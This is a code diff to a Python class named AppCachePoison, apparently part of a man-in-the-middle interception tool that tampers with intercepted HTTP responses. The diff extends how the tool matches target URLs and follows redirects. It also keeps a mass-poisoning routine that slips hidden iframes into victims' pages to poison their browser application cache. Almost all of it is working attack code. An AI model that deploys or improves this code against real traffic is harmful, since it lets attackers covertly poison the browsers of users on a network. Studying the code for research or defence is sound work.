@@ -41,14 +41,12 @@ class AppCachePoison(DummyResponseTamperer):
                 logging.log(logging.DEBUG, "Tampering disabled in this useragent (%s)" % (req_headers["user-agent"]))
                 return data
                
-        url = self.urlMonitor.getRedirectionSource(url)
+        urls = self.urlMonitor.getRedirectionSet(url)
         
-        (s,element) = self.getSectionForUrl(url)
+        (s,element,url) = self.getSectionForUrls(urls)
         if not s:
           data = self.tryMassPoison(url, data, headers, req_headers, ip)
           return data
-        
-
         logging.log(logging.WARNING, "Found URL %s in section %s" % (url, s['__name__']))
         p = self.getTemplatePrefix(s)
         if element == 'tamper':
@@ -78,10 +76,8 @@ class AppCachePoison(DummyResponseTamperer):
         return data
 
     def tryMassPoison(self, url, data, headers, req_headers, ip):
-        browser_id = ip
-        if "user-agent" in req_headers:
-            browser_id += req_headers["user-agent"]
-            
+        browser_id = ip + req_headers.get("user-agent", "")
+
         if not 'mass_poison_url_match' in self.config: # no url
             return data
         if browser_id in self.mass_poisoned_browsers: #already poisoned
@@ -105,7 +101,7 @@ class AppCachePoison(DummyResponseTamperer):
         html = "<div style=\"position:absolute;left:-100px\">"
         for i in self.config:
             if isinstance(self.config[i], dict):
-                if self.config[i].has_key('tamper_url'):
+                if self.config[i].has_key('tamper_url') and not self.config[i].get('skip_in_mass_poison', False):
                     html += "<iframe sandbox=\"\" style=\"opacity:0;visibility:hidden\" width=\"1\" height=\"1\" src=\"" + self.config[i]['tamper_url'] + "\"></iframe>" 
 
         return html + "</div>"
@@ -147,14 +143,17 @@ class AppCachePoison(DummyResponseTamperer):
     def getManifestUrl(self, section):
       return section["manifest_url"]
 
-    def getSectionForUrl(self, url):
-        for i in self.config:
-          if isinstance(self.config[i], dict): #section
-            section = self.config[i]
-            if section.has_key('tamper_url') and section['tamper_url'] == url:
-              return (section, 'tamper')
-            if section.has_key('manifest_url') and section['manifest_url'] == url:
-              return (section, 'manifest')
+    def getSectionForUrls(self, urls):
+        for url in urls:
+            for i in self.config:
+              if isinstance(self.config[i], dict): #section
+                section = self.config[i]
+                if section.has_key('tamper_url') and section['tamper_url'] == url:
+                  return (section, 'tamper',url)
+                if section.has_key('tamper_url_match') and re.search(section['tamper_url_match'], url):
+                  return (section, 'tamper',url)
+                if section.has_key('manifest_url') and section['manifest_url'] == url:
+                  return (section, 'manifest',url)
 
-        return (False,'')
+        return (False,'',urls.copy().pop())
 
